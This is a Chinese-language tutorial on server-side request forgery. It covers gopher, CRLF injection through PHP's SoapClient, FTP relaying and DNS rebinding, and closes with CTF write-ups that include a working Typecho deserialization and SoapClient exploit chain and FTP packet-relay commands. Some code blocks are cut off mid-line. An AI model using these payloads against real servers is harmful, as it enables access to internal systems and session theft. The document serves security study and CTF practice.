# SSRF漏洞学习
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## SSRF简介
SSRF(Server-Side Request
Forgery:服务器端请求伪造是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。
如图是一个简单的SSRF
源码如下
    HTTP/1.1 200 OK
    Host: 127.0.0.1:2222
    Date: Tue, 26 May 2020 03:53:05 GMT
    Connection: close
    X-Powered-By: PHP/7.3.15-3
    Content-type: text/html; charset=UTF-8
    123
所以在`SSRF`时利用`gopher`协议我们就可以构造任意TCP数据包发向内网了
## 利用CRLF
在HTTP的TCP包中，HTTP头是以回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)进行分割的。
下图是一个示例：
如果我们能在输入的url中注入`\r\n`，就可以对`HTTP Headers`进行修改从而控制发出的`HTTP`的报文内容
比如下图
`USER anonymous`等就是通过`CRLF`注入插入的伪`HTTP Header`
## PHP中利用Soap Client原生类
SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。
其采用HTTP作为底层通讯协议，XML作为数据传送的格式。
在PHP中该类的构造函数如下：
    public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）
第一个参数是用来指明是否是wsdl模式。
第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri
是SOAP服务的目标命名空间。具体可以设置的参数可见官方文档
其中提供了一个接口
    The user_agent option specifies string to use in User-Agent header.
此处本意是注入`User_Agent` HTTP请求头,但是此处存在CRLF注入漏洞，因此我们在此处可以完全控制HTTP请求头
利用脚本如下
     $target,
                                    'user_agent'=>"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
                                    'uri'      => "aaab"));
## 利用FTP作为跳板
FTP是基于TCP的在计算机网络上在客户端和服务器之间进行文件传输的应用层协议
通过FTP传输的流量不会被加密，所有传输都是通过明文进行的，这点方便我们对的数据包进行编辑。
FTP协议中命令也是通过`\r\n`分割的 同时FTP会忽略不支持的命令并继续处理下一条命令，所以我们可以直接使用HTTP作为FTP包的载荷
同时通过使用`PORT`命令打开FTP主动模式,可以实现TCP流量代理转发的效果
    # STEP 1 向FTP服务传TCP包
    TYPE I
    PORT vpsip,0,port
    STOR tcp.bin
    # STEP 2 让FTP服务向内网发TCP包
    TYPE I
    PORT 172,20,0,5,105,137
    RETR tcp.bin
## DNS Rebinding
针对`SSRF`,有一种经典的拦截方式
  1. 获取到输入的URL，从该URL中提取host
  2. 对该host进行DNS解析，获取到解析的IP
  3. 检测该IP是否是合法的，比如是否是私有IP等
  4. 如果IP检测为合法的，则进入curl的阶段发包
第三步对IP进行了检测，避免了内网SSRF
然而不难发现此处对HOST进行了两次解析，一次是在第二步检测IP，第二次是在第四步发包。那么我们很容易有以下绕过思路
控制一个域名`xxx.xxx`，第一次DNS解析，`xxx.xxx`指向正常的ip，防止被拦截
第二次DNS解析，`xxx.xxx`指向127.0.0.1(或其他内网地址)，在第四步中curl向第二次解析得到对应的内网地址发包实现绕过
这个过程已经有了较为完善的利用工具
比如
###  例题
主要分析题目中的SSRF部分
####  MRCTF2020 Ezpop Revenge
目标是访问`/flag.php` 但限制了访问请求的来源ip必须为`127.0.0.1`也就是本地访问
此题的前半部分在于typecho pop链的构造此处就不过多赘述，直接上Exp
    coincidence = $coincidence;
        }
        function  __wakeup(){
            $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);
        }
    }
    class Typecho_Request{
        private $_params;
        private $_filter;
        function __construct($params,$filter){
            $this->_params=$params;
            $this->_filter=$filter;
        }
    }
    class Typecho_Feed{
        private $_type = 'ATOM 1.0';
        private $_charset = 'UTF-8';
        private $_lang = 'zh';
        private $_items = array();
        public function addItem(array $item){
            $this->_items[] = $item;
        }
    }
    $target = "http://127.0.0.1/flag.php";
    $post_string = '';
    $headers = array(
        'X-Forwarded-For: 127.0.0.1',
        'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2'
    );
    $a = new SoapClient(null,array('location' => $target,
                                    'user_agent'=>"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
                                    'uri'      => "aaab"));
    $payload1 = new Typecho_Request(array('screenName'=>array($a,"233")),array('call_user_func'));
    $payload2 = new Typecho_Feed();
    $payload2->addItem(array('author' => $payload1));
    $exp1 = array('hello' => $payload2, 'world' => 'typecho');
    $exp = new HelloWorld_DB($exp1);
    echo serialize($exp)."\n";
    echo urlencode(base64_encode(serialize($exp)));
其中`$a`为SOAP载荷，`call_user_func()`对SOAP对象进行了主动调用从而触发了请求。
这里关键是使用了PHP的`SoapClient`进行了一个SSRF
     $target,
                                    'user_agent'=>"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
                                    'uri'      => "aaab"));
通过`CRLF`注入`PHPSESSION` 然后访问`/flag.php`
php将flag放入`session`中,我们再带着这个`SESSION`去访问对应网页就能获取到存储的flag了
####  MRCTF2021 half nosqli
这个题的前半部分在于Mongodb永真式万能密码绕过，后半部分就是SSRF
首先可以打到自己vps上看看效果
    headers = {
        "Accept":"*/*",
        "Authorization":"Bearer "+token,
    }
    url_payload = "http://buptmerak.cn:2333"
    json = {
        "url":url_payload
    }
    req = r.post(url+"home",headers=headers,json=json)
    print(req.text)
发现发送了HTTP的请求包